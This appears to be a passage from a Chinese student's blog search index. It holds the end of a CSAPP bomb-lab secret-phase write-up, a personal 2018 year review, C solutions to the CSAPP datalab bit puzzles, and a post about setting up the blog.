cmp $0x3,%eax401602: 75 31 jne 401635 &lt;phase_defused+0x71&gt; // 没有读取到三个，原地爆炸401604: be 22 26 40 00 mov $0x402622,%esi401609: 48 8d 7c 24 10 lea 0x10(%rsp),%rdi40160e: e8 25 fd ff ff callq 401338 &lt;strings_not_equal&gt; // 将读取的字符串与0x402622为首地址的字符串作比较401613: 85 c0 test %eax,%eax401615: 75 1e jne 401635 &lt;phase_defused+0x71&gt; // 字符串和给定的不相同，还是爆炸 恩，好吧，从一个给定的串中读取一些东西，打印0x402619后面的几个字符，我们发现结果是“%d %d %s”，读取两个整数和一个字符串。可事情并没有这么简单。我们尝试打印一下0x603870，发现字符串就只有“7 0”，不可能读3个数字。那我们怎么玩？？ 看来我们只好作弊了。使用gdb直接用print指令更改内存的值，将“7 0”后面补一点东西，补什么呢？那当然是0x402622上面的东西了。打印一下，发现是“DrEvil”，好吧满满的恶意。补上之后（可以用类似 p {int}0x603873=’D’ 这样的指令为内存单元赋值），就顺利进入了secret_phase函数了。 再看一下这个函数干了些什么。恩，读取了一个字符串，再用strtol函数将其转化为数字，也就是说，我们目的就是输入一个满足要求的数字。然后，又与2进行比较，也就是说，我们目的是要运行fun7函数，并且得到答案为2的返回值。 接下来我们看一下fun7函数。主体大概是这样子的。可以看出，这是一个递归。其中的v为我们输入的那个值。1234567if (x &lt;= v) &#123; return 2 * fun7(...);&#125;else if (x == v) return 0;else &#123; return 2 * fun7(...)+1;&#125; 好了，我们发现代码中有0x8(%rdi),%rdi这样的指令，接下来又要打印内存信息了。注意到一开始传入的值为0x6030f0,故我们打印一下0x6030f8和0x603100的值，发现答案为0x603110和0x603130,又是两个地址。并且，打印0x6030f0,0x603100,0x603110我们发现，结果都是一个比较小的值，不难猜测，这应该是一个二叉树。于是，按照这个规律，我们可以将整棵树打印出来.（其中各个框内表示的是该点的地址） 0x6030f00x6031100x6031300x6031900x6031500x6031700x6031b00x6031f00x6032500x6032700x6032300x6031d00x6032900x6032100x6032b0 接着，再倒推，2 = 2 * 1, 1 = 2 * 0 + 1 . 则应该选择地址为0x603150的点，打印得到，答案为22，结束。]]></content>
      <categories>
        <category>csapp</category>
      </categories>
      <tags>
        <tag>csapp</tag>
        <tag>assembly</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[summary-2018]]></title>
    <url>%2F2019%2F01%2F01%2Fsummary-2018%2F</url>
    <content type="text"><![CDATA[2018年的一个小总结： 首先，其实不知道应该说什么比较好，整个2018年的话，应该还是算过得去吧。不知道该写什么，就还是按照时间的顺序写一下一些对我影响比较大的事情吧。 年初 记得2018年刚开始的时候，感慨还是挺深的，毕竟处在高三的中期，各个科目也基本都开始了总复习，心情还是略有些紧张的。尽管对很多事情都不确定，但还是硬着头皮往前走，当时基本上就一个目标，把高考考好。那段时间也算是挺努力的了，寒假也没玩什么游戏，基本上花了挺多时间来学习。 四五月份 这段时间就算是出生以来最难熬的一段时期了。天气十分的炎热，坐在教室里也几乎静不下心来学习。整个人的状态很乱。每天基本上就是刷题，除了题目还是题目，整个人真的十分的疲惫，但也没有任何办法，只能继续坚持下去。也许，那段时间也算是大学之前一段十分快乐的时光吧， 毕竟全班的同学一起向着同一个目标努力，这种机会以后基本上也都不会再有了。 六月七号 八号 每一年的这两天我想对全国的几百万考生来说都是及其难忘的。即便现在已经过了半年，那个时候自己的状态，心情，甚至在什么时间干了什么事，至今都记忆犹新。还有印象六月七号的那个晚上，下课时分，和另一个同学一起，在教室里谈论着未来。将来会发生什么事呢？考试要是砸了会怎么样呢？恩，基本上整个人都在那样的状态下，坐立不安。 到了六月八号下午，也许那是在那段时间心态最平和的时候了，什么也没说，什么也没想。考完恍若隔世，也是吧，毕竟十几年的读书最终换来的，最主要的也便是那一张写着成绩的白纸罢了。和父母一起，走在学校的街道上，心情说不上好，说不上坏。考完了，理论上来说应该是要比较开心的，可是在这种场合下却也怎么都开心不起来。是的，一个强烈的直觉告诉我：这次考试考得并不好，或者说很差。 接下来的一段时间里，基本上还是尽量让自己不要再去回忆考试的事情了。考得好坏都已经注定，再去想确实也没有任何意义。那段时间和母亲一起去珠海找我哥，又去普宁了一个同学家玩，接下来就是毕业典礼，然后就是揭晓成绩的时刻。 成绩揭晓 恩，看到成绩出来的那一刻，就像高考完铃声响起的刹那，脑子是空白的，不知该说些什么。然后就是不敢相信自己–我拿到了自己几乎未曾想过的分数，甚至都不敢去再看它一眼。还有印象，那个中午我啥也没吃，就躺在床上发呆，想想自己今后的路该怎么走。是要复读吗？不，绝对不行，我没有勇气去再面对一次高三。就这样吧，差一点就差一点吧，毕竟考试总有人会考得不好的，为什么不能偏偏是我呢？基本上，其实经过了一两天的缓和，也就没有再去想那么多了。尽管现在再次提起还是有些难过的，但也没办法吧。 后面到八月初，就又是一段算是十分快乐的时光了。加入了本地的一个补习社，和几个小伙伴们一起，备课，讲课，每天基本上都是在这样的重复中度过。最多的时候一天能有8节课，常常不得已要利用睡觉的时间来备课。那段时间觉得很累，但是却很舒坦。这里放一张照片纪念一下。 Before enter University 在忙完了辅导社之后，接下来的时间基本上都是在做一些提前的学习了。毕竟想要在大学考得好，还是需要提前下一番功夫，起码在这一点，要比别人赢在起跑线上，真的不愿意再一次输了。也就是在那段时间，认识了吴晓杰师兄和陈钊燚师兄，也是在他们的帮助下，对大学有了一点了解，也算是更加了解了一下自己究竟想要一些什么。然后就是在不断的学习了。 很奇怪，也许是高考考得不好，也许是因为一些其他什么事情，自从那段时间以来，心里最大的目标就只剩学习（其实还有看番hhh）了。可能是心里那一股不服输的劲吧，以及对自己越来越高的要求，总是不断地告诉自己，必须比别人多付出更多的时间，一定要学得更多，更好。也是从那段时间开始，基本上就已经不再碰任何游戏了，社团也不想参加，变成了一个真真正正的“宅”了。也许这确实有些不好吧。 Enter UniqueStudio 经过了开学以来的努力学习，以及一点运气，最后终于挺过了数轮面试，进入到了联创团队（uniquestudio）当中。还是很高兴能成为团队的一员的，至少说明了，自己的努力真的还是有回报的。然后再接下来，到年底的时间里面，基本上大部分的课余时间都留给了团队了。平均每周四五十小时以上的学习时间，一周又一周地过去。 刚开始进来的那段时间，也许是最艰难的。很多东西都完全不会，android studio的各种配置什么的问题可以卡好几天。在第一个任务的时候，还啥都不会，所有东西都是边学边做，一个小功能要重复改来改去弄好多遍，往往弄很多遍之后还是不太好，弄到自己也是很烦躁。所以第一个任务做得很差。到了第二个任务的时候，慢慢地开始注意了一些设计模式方面的问题，不会太盲目地想往哪里加功能就往哪里加，不过也是由于经验太少，反复踩了很多坑。好在最后终于算是基本完成了要求了，尽管花的时间比预计的要多一些。基本上对很多东西的了解又加深了一些。 再后面已经接近年末了，第二期任务做完一段时间过后，搭建了自己的第一个博客，也就是这里。也开始尝试这把自己的一些想法记录下来吧。然后也下决心开始看CSAPP这一本书了。说实话，这本书确实很多东西讲得很好（尽管我现在看的还很少），基本上能把我想要知道的东西都讲了，不过语言还是令人很难受的一个坎，毕竟从初中开始英语就不怎么样。好在还有翻译这种神奇的东西，基本上靠半蒙半查加上一点直觉，慢慢地让自己能够静下心来看这本书了，也算是自己的一个进步了吧。 然后就基本上到了年末了，也就是前几天了。慢慢开始减少了一些花在这方面的时间了，稍微把时间分配给了一下课内的一些知识，毕竟说到底，到现在我都没办法确定自己究竟想要读研究生还是直接出来工作，毕竟大一上学期还是不要太早下论断的好吧。还是得看一下这学期末的成绩吧，如果能够考得比较好，将来有希望能保研去清北复交或者浙大中科大之类的，那还是有可能争取一下的。这个寒假应该就需要结合自己的成绩想清楚了吧。 expection 其实感觉这东西很说不准。毕竟现在真的还没办法未来要做什么。但近期的一些flag还是可以立一下的。尽量在寒假把CSAPP多看一点吧，最好能看完70%以上吧，以及最好多做几个实验，也算是巩固一下自己看书学到的一些知识。然后下学期开始后尽量快点把这本书看完，接着花几个星期的时间把开发艺术探索，源码设计模式等补了，有时间的话看一下争取在大一下学期结束之前把计网和现代操作系统看了吧。基本上大一能把这几本书看完就已经很不错了。 然后如果将来要走偏图形这一块的话，那可能需要稍微为这方面做一点准备了。以及线代一定要学好。如果将来选择争取保研的话，那可能要找一些数学方面的更深入的书籍学习一下，物理可能也需要花一些时间。毕竟理工科无论如何这两个科目一定不能差吧。 然后如果将来选择放弃保研，毕业后就直接出来工作的话，那可能会在大一的暑假看一下linux内核的一些东西或者是Android底层的源码，起码要比现在再深入一些吧。 Summary 最后还是再罗嗦一下吧。总的来说，2018年对我自己来说确实可以称得上是转折性的一年。这一年里发生了太多值得我去回忆的事情。我也很庆幸，自己能够变成现在这个样子，尽管它未必很好。很开心，现在身边能有很多优秀的同学值得我去学习，未来的路子还长，还需要一步一个脚印继续慢慢往前走去。 结尾还是要放点啥，就留下我特别喜欢的一段话吧： 人の人生は、自分の墓へ走る汽车に乗っているようだ。途中は沢山駅があるけど、ずっと最後まで侧にいってくれる人はいない。だから、いってくれた人が降りる前に、いくらさびしくても、感谢の気持ちでさよならと言おう。]]></content>
      <categories>
        <category>summary</category>
      </categories>
      <tags>
        <tag>summary</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[csapp-Datalab]]></title>
    <url>%2F2018%2F12%2F25%2Fcsapp-Datalab%2F</url>
    <content type="text"><![CDATA[序 这是csapp系列的第一篇文章。本文主要讲一下关于 datalab [Updated 11/2/18] 的解决方法以及简单的思路。如果有哪里写的不清楚或者有问题，欢迎联系我修改(右下角小图标点开即可对话)。 注：其中某些题目应该有更优的解法。以下仅供参考 bitXor题意：用 ~ 和 &amp; 运算符实现 Xor 运算符思路：我们知道Xor运算符是对每一个位，相同的话返回0，不同的话返回1。题目中仅有 &amp; 是双目运算符，那么我们可以采用 &amp; 运算符获得均为1的位，再取反，同理，用 &amp; 和 ~ 获得均为 0 的位，再取反，最后两者再进行 &amp; ，即可得到答案。解：123int bitXor(int x, int y) &#123; return ~(x&amp;y)&amp;~(~x&amp;~y);&#125; tmin题意：让你输出反码下的最小值思路：水题。。直接由定义得。解：123int tmin(void) &#123; return 1&lt;&lt;31;&#125; isTmax题意：判断一个数是否为反码下的最大值思路：若x为Tmax，x+1取反之后应该等于x。故可以采用取反与原数Xor的思路。但要注意，0xffffffff也满足该性质，需要排除。解：123int isTmax(int x) &#123; return !(~(x+1)^x)&amp;!(!(~x));&#125; allOddBits题意：判断一个数是否所有的奇数位都为1。(位的序号从0到32)思路：我们知道，若奇数位为均为1，则右移一位后偶数位均为1，两者相与的话为0xffffffff。利用该性质可得到答案。不过要注意，偶数位上的1会影响我们的判断，故需要利用掩码将其过滤。(0xA = 1010)解：1234int allOddBits(int x) &#123; x = x &amp; 0xAAAAAAAA; return !(~(x|(x&gt;&gt;1)));&#125; negate题意：求一个数的相反数。思路：水题，由常用结论我们知道，-x = ~x + 1解：123int negate(int x) &#123; return ~x+1;&#125; isAsciiDight题意：判断一个数字是否在(0x30和0x39)之间思路：这道题我想不出比较好的解法。只能暴力判断。即先看2进制下的前26六位是否有值，然后在看下后6位。x+6仍然小于0x40，则x小于0x3。.再看下剩下六位中前两位是否均为1，是的话x大于0x30。解：12345int isAsciiDigit(int x) &#123; int t = x &amp; 0xFFFFFFC0; x = x &amp; 0x3F; return !t&amp;!((x+6)&amp;0x40)&amp;(x&gt;&gt;4)&amp;(x&gt;&gt;5)&amp;1;&#125; conditional题意：实现三目运算符 ？：思路：先用！判断是否为x是否为真。然后在利用与的性质：一个数和0xffffffff相与结果为其本身，和0相与结果为0。解：1234int conditional(int x, int y, int z) &#123; x = !x; return y&amp;(~(!x)+1) | z&amp;(~x+1);&#125; isLessOrEqual题意：判断x是否小于等于y思路：x&lt;=y 则 y - x &gt;= 0。分别取出x和y的符号，进行判断。若y大于0，x小于0，则显然为真。若y小于0，x大于0，则显然为假。剩下的异号的情况则用y + (-x) 判断即可。解：12345int isLessOrEqual(int x, int y) &#123; int sgnx = (x&gt;&gt;31)&amp;1; int sgny = (y&gt;&gt;31)&amp;1; return !sgny &amp; sgnx | !(sgnx^sgny) &amp; !((y + (~x+1))&amp;(1&lt;&lt;31));&#125; logicalNeg题意：使用其他的逻辑运算符和位运算符实现 ！运算符思路：我们知道，一个数的相反数等于其本身的数只有0(注意：~0x80000000 + 1 = 0x80000000)解：123int logicalNeg(int x) &#123; return ((~x+1 | x)&gt;&gt;31)+1;&#125; howManyBits题意：给一个数字x,求出要表示出x需要的最少的位数。思路：个人觉得，本题难度很大。以下的思路可能并不算很好，不过还是可以通过的。 首先，我们知道，对于一个n位的二进制数，能表示的数字的范围为 -2n ~ 2n - 1。故对于输入的整数x，我们可以先将其变成正数，即下方的_mask。现在就只需考虑正数。题目转化为求最高位的1。但最高位的1不是很好求，我们可以将其转化为求二进制下x含有多少个1。 假设当前最高位的1位于第5位，右移并按位或后，第五位，第四位均为1，再向右移两位并且按位或，第二、三、四、五位均为1，以此类推，我们将最高位的1后的所有位全部变成了1。(假设原数为0x0A0BA973，经过处理之后就会变成0x0FFFFFFF)。 接下来考虑如何求出所有位上1的总数。我们可以考虑使用分段的办法。考虑以下的32位二进制数,我们将其分成四个部分： 00000010 | 00100111 | 11010010 | 00110001接下来我们采用掩码分别将其各个部分的1的总数做一个累加，掩码应为： 00000001 | 00000001 | 00000001 | 00000001即对每一个部分，掩码的值都是1。接下来用&amp;运算符获得最低位的数字，四个部分分别为0,1,0,1. 然后，再将x右移一位，再继续进行&amp;运算，以此类推，最后得到四个部分的值分别为：1,4,4,3。即最后得到的sum为： 00000001 | 00000100 | 00000100 | 00000011最后再利用掩码0xff(11111111)，分别得到各个部分的值，做一个累加，得到答案(别忘记+1)。解：12345678910111213141516171819int howManyBits(int x) &#123; int _mask = (x&amp;(1&lt;&lt;31))&gt;&gt;31; x = x^_mask; x |= x&gt;&gt;1; x |= x&gt;&gt;2; x |= x&gt;&gt;4; x |= x&gt;&gt;8; x |= x&gt;&gt;16; int sum = 0, mask = 0x1 | 0x100 | 0x10000 | 0x1000000; sum += x &amp; mask; sum += (x&gt;&gt;1) &amp;mask; sum += (x&gt;&gt;2) &amp;mask; sum += (x&gt;&gt;3) &amp;mask; sum += (x&gt;&gt;4) &amp;mask; sum += (x&gt;&gt;5) &amp;mask; sum += (x&gt;&gt;6) &amp;mask; sum += (x&gt;&gt;7) &amp;mask; return (sum&amp;0xff) + ((sum&gt;&gt;8)&amp;0xff) + ((sum&gt;&gt;16)&amp;0xff) + ((sum&gt;&gt;24)&amp;0xff) + 1;&#125; floatScale2题意：本题给一个无符号数，让你把它看成一个浮点数(都是32位)，让你输出x * 2 的值思路：比较简单，按照浮点数1,8,23的分布将符号，指数，尾数分别取出，并分类讨论即可。解：123456789101112131415unsigned floatScale2(unsigned uf) &#123; unsigned frac = uf&amp;0x007fffff; uf&gt;&gt;=23; unsigned exp = uf&amp;0xff; uf&gt;&gt;=8; if (!exp) &#123; frac &lt;&lt;= 1; int t = frac&gt;&gt;23; if (t) &#123; frac = frac &amp; 0x007fffff; exp++; &#125; &#125; else if (exp != 0xff) exp++; return (uf&lt;&lt;31) + (exp&lt;&lt;23) + frac;&#125; floatFloat2Int题意：给你一个无符号数，并将其看成浮点数(32位)，要求输出(int)x的值思路：本题依然在考察对浮点数的基本理解。解决的思路同上题类似，不再赘述。另外提醒一下，本题有个坑，求得到的bias直接拿来进行右移运算或左移运算会存在问题：&gt;&gt; 和 &lt;&lt; 运算符当偏移量超过32时，会自动进行取模运算，故有可能使得结果出现错误。左移的话有可能还会导致答案溢出。记得分类讨论。解：1234567891011121314151617181920212223242526int floatFloat2Int(unsigned uf) &#123; int frac = uf &amp; 0x007fffff; uf &gt;&gt;= 23; int exp = uf &amp; 0xff; uf &gt;&gt;= 8; int sgn = uf; if (exp == 0xff) return 0x80000000u; else if (!exp) return 0; else &#123; frac |= 0x800000; int bias = exp - 0x7f - 23; if (bias &lt; 0) &#123; bias = -bias; if (bias &gt;= 32) bias = 31; frac &gt;&gt;= bias; &#125; else if (bias &gt; 0) &#123; while(bias) &#123; frac&lt;&lt;=1; bias--; if (frac &lt; 0) return 0x80000000u; &#125; &#125; if (sgn) return -frac; else return frac; &#125;&#125; floatPower2题意：给一个整数x，要求输出2.0x的值。思路：同样，本题依然在考察对浮点数存储的基本理解。要注意的是，+INF的是指exp为0xff，frac为0的值。NaN指的是exp为0xff，frac不为0的值。0的浮点数表示依然为0。解：12345678910unsigned floatPower2(int x) &#123; int sgn = 0, exp = 0, frac = 0; if (x &lt; -126 - 23) return 0; else if (x &lt; -126) frac = 1 &lt;&lt; (149+x); else &#123; exp = x + 127; if (exp &gt; 0xff) return 0x7f800000; &#125; return (exp&lt;&lt;23) + frac;&#125; 结尾 倘若一切顺利，你最终将得到类似这样的一张图片： 那么恭喜你，你的第一个实验————Datalab通关啦！]]></content>
      <categories>
        <category>csapp</category>
      </categories>
      <tags>
        <tag>csapp</tag>
        <tag>binary</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[First article]]></title>
    <url>%2F2018%2F12%2F14%2FFirst-article%2F</url>
    <content type="text"><![CDATA[First article 终于基本把博客弄完了 感觉现在充满了成就感O(∩_∩)O。从这星期一开始就想弄了，但是却一直拖着。前两天在学HTML的一些语法，觉得语法真的好多啊，而且有点复杂。然后周三周四就基本都是在看搭博客的一些相关的东西，花了好长时间，一直在踩坑（可能是我比较菜）。买域名，弄github pages什么的。一开始用jekyll的框架来搭建，遇到了无数的问题，最后好在基本解决了，但是又发现踏入了一个新的大坑：找不到好用的模板。然后最后看到了hexo，果断先找模板。在看到了nexT这个主题之后，果断选择入坑。 可能是由于之前jekyll踩的坑有点多，也有可能是hexo比较适合小白。。基本上这个搭建过程中没有出现什么比较大的问题，然后弄完就是各种优化什么的，也算比较顺利吧，到今天早上就基本算是结束了。整体上还是过得去的。（不过貌似手机版看起来的效果比较差？？） 然后在这里就还是来立一个flag吧。以后（至少应该是大学期间吧）这个博客应该是会一直做下去的，尽量每个月至少发一篇博客吧，不过比较忙的时候的话可能没什么办法。基本上大部分博客的内容应该是以硬核为主，不过目前水平不够，也没办法写出比较高质量的东西。内容上可能主要是当前阶段在学习的一些东西，算法，数据结构，或者是自己做的一些小项目，课设什么的也有可能会放进来。目的还是分享吧，如果有什么地方写的不太好，欢迎直接私戳（网页版的话右下角应该是有一个对话框的）。 好吧，憋不出来了。。就这样吧 哦对了，最后放上一张有爱的图片镇楼（p站上找的）。]]></content>
      <categories>
        <category>others</category>
      </categories>
      <tags>
        <tag>others</tag>
      </tags>
  </entry>
</search>
